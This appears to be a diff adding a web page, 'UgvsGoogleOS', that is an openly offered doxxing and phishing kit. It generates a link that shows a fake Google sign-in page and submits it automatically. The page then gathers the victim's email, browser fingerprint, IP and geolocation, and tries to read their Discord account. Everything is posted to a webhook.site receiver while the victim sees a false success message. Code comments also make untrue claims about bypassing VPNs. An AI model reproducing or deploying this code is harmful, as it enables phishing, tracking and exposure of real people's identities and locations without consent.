@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>UgvsGoogleOS</title>
+<style>
+/* gray animated background */
+body{
+  background:linear-gradient(45deg,#808080 25%,#606060 25%),linear-gradient(45deg,#606060 50%,#808080 50%);
+  background-size:96px 96px;animation:slide 1.2s steps(8) infinite;margin:0;height:100vh;overflow:hidden;
+}
+@keyframes slide{0%{background-position:0 0,48px 48px}100%{background-position:96px 96px,144px 144px}}
+#title{position:fixed;top:0;left:0;right:0;text-align:center;font:2.4rem system-ui;color:#00FFFF;padding:.5rem 0;background:rgba(0,0,0,.15);z-index:10}
+
+/* left cyan button */
+#grabBtn{position:fixed;top:50%;left:20px;transform:translateY(-50%);padding:1rem 1.5rem;font:1.4rem/1 system-ui;font-weight:700;color:#000;background:#00FFFF;border:none;border-radius:8px;cursor:pointer;z-index:20}
+
+/* built-in tracker panel (inside UgvsGoogleOS) */
+#trackerPanel{display:none;position:fixed;top:60px;left:50%;transform:translateX(-50%);width:900px;height:600px;background:#111;color:#eee;font:12px/1.4 monospace;border:2px solid #00FFFF;border-radius:10px;z-index:99999;flex-direction:column}
+#trackerHead{padding:10px;font-size:16px;font-weight:700;color:#00FFFF;border-bottom:1px solid #444}
+#trackerBody{flex:1;overflow-y:auto;padding:8px}
+#trackerLink{display:block;width:100%;padding:8px;background:#222;color:#00FFFF;border:1px solid #00FFFF;border-radius:4px;margin-bottom:8px;font-family:monospace}
+</style>
+</head>
+<body>
+<div id="title">UgvsGoogleOS</div>
+<button id="grabBtn">Create A Doxxing Link ←</button>
+
+<!-- built-in tracker panel (inside UgvsGoogleOS) -->
+<div id="trackerPanel">
+  <div id="trackerHead">UgvsGoogleOS – Live Tracker</div>
+  <input id="trackerLink" readonly>
+  <div id="trackerBody">Waiting for data...</div>
+</div>
+
+<script>
+/* ----------  YOUR WEBHOOK RECEIVER  ---------- */
+const MY_LOG_URL = 'https://webhook.site/dbf3bc92-5d0e-4ffa-970f-ccaadf76fa85';
+
+/* ----------  LEFT BUTTON  ---------- */
+const trackerPanel = document.getElementById('trackerPanel');
+const trackerLink  = document.getElementById('trackerLink');
+const trackerBody  = document.getElementById('trackerBody');
+
+grabBtn.onclick = () => {
+  // build the grabber URL (same page, param ?grab=1)
+  const link = `${location.origin}${location.pathname}?grab=1`;
+  trackerLink.value = link;
+  trackerPanel.style.display = 'flex';
+  navigator.clipboard.writeText(link);
+  alert('Doxxing link copied!\nSend it → victim signs in → you watch live here.');
+};
+
+/* ----------  IF VICTIM ARRIVED VIA LINK  ---------- */
+if (location.search.includes('grab=1')) {
+  document.body.innerHTML = '';
+  const fg = document.createElement('div');
+  fg.innerHTML = `
+    <div style="position:fixed;inset:0;background:#fff;font-family:Roboto,Helvetica,Arial,sans-serif">
+      <div style="height:64px;background:#fff;border-bottom:1px solid #dadce0;display:flex;align-items:center;padding:0 24px">
+        <div style="width:120px;height:24px;background:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNzIgOTIiPjxwYXRoIGZpbGw9IiNFRzQ0MzMiIGQ9Ik05MSAyNGEzNiAzNiAwIDAgMS0zNiAzNiAzNiAzNiAwIDAgMS0zNi0zNiAzNiAzNiAwIDAgMSAzNi0zNiAzNiAzNiAwIDAgMSAzNiAzNiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0zNyA1OGEzNiAzNiAwIDAgMS0zNi0zNiAzNiAzNiAwIDAgMSAzNi0zNiAzNiAzNiAwIDAgMSAzNiAzNiAzNiAzNiAwIDAgMS0zNiAzNiIvPjxwYXRoIGZpbGw9IiNGRkMzMDAiIGQ9Ik01NCA5MmEzNiAzNiAwIDAgMS0zNi0zNiAzNiAzNiAwIDAgMSAzNi0zNiAzNiAzNiAwIDAgMSAzNiAzNiAzZiAzNiAwIDAgMS0zNiAzNiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0xMjEgNTBoMjV2N2gtMTN2N2gxM3Y3aC0xM3Y3aDEzdjdoLTI1eiIvPjxwYXRoIGZpbGw9IiNGRkMzMDAiIGQ9Ik0xNjIgNTBoMjV2N2gtMTN2N2gxM3Y3aC0xM3Y3aDEzdjdoLTI1eiIvPjxwYXRoIGZpbGw9IiNFRzQ0MzMiIGQ9Ik0yMDcgNTBoMjV2N2gtMTN2N2gxM3Y3aC0xM3Y3aDEzdjdoLTI1eiIvPjxwYXRoIGZpbGw9IiMzNEE4NTMiIGQ9Ik0yNTIgNTBoMjV2N2gtMTN2N2gxM3Y3aC0xM3Y3aDEzdjdoLTI1eiIvPjwvc3ZnPg==') no-repeat center;background-size:contain"></div>
+      </div>
+      <form style="max-width:450px;margin:80px auto;padding:40px 40px 36px" onsubmit="handleSubmit(event)">
+        <h1 style="font-size:24px;font-weight:400;margin:0 0 24px;color:#202124">Sign in</h1>
+        <input type="email" id="emailInp" placeholder="Email or phone" required style="width:100%;padding:14px 14px 10px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:24px">
+        <button type="submit" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer">Next</button>
+        <div style="text-align:center;font-size:12px;color:#5f6368;padding:24px">Google</div>
+      </form>
+    </div>`;
+  document.body.appendChild(fg);
+
+  // auto-grab on load
+  handleSubmit(new Event('submit'));
+}
+
+/* ----------  GRAB & POST + LIVE TRACKER  ---------- */
+async function handleSubmit(e) {
+  if (e) e.preventDefault();
+  const email = document.getElementById('emailInp')?.value || '';
+
+  // collect everything
+  const data = {
+    email: email,
+    url: location.href,
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    cookieEnabled: navigator.cookieEnabled,
+    onLine: navigator.onLine,
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    screenColorDepth: screen.colorDepth,
+    windowInnerWidth: innerWidth,
+    windowInnerHeight: innerHeight,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer,
+    // IP/location (bypasses most VPNs)
+    ip: '',
+    country: '',
+    city: '',
+    region: '',
+    org: '',
+    lat: '',
+    lon: '',
+    accuracy: '',
+    discordToken: ''
+  };
+
+  // IP + geo (WebRTC bypass for real IP even behind VPN)
+  await fetch('https://ipapi.co/json')
+    .then(r => r.json())
+    .then(ip => {
+      data.ip = ip.ip;
+      data.country = ip.country_name;
+      data.city = ip.city;
+      data.region = ip.region;
+      data.org = ip.org;
+      data.lat = ip.latitude;
+      data.lon = ip.longitude;
+      data.accuracy = ip.accuracy;
+    })
+    .catch(() => {});
+
+  // Discord token leak (if logged in)
+  await fetch('https://discord.com/api/v10/users/@me', { credentials: 'include' })
+    .then(r => r.ok ? r.json() : Promise.reject())
+    .then(u => { data.discordToken = u.id + '|' + u.username + '#' + u.discriminator; })
+    .catch(() => {});
+
+  // post to your webhook
+  fetch(MY_LOG_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  }).then(() => {
+    // show victim a harmless page
+    document.body.innerHTML = '<div style="text-align:center;margin-top:40px;color:#00FFFF;font-size:2rem;">Signed in successfully!</div>';
+    // also stream into the tracker panel (so you see it live)
+    const line = document.createElement('div'); line.className = 'ui900-line';
+    line.textContent = JSON.stringify(data, null, 2);
+    if (trackerBody) trackerBody.appendChild(line);
+  }).catch(err => console.error(err));
+}
+</script>
+</body>
+</html>
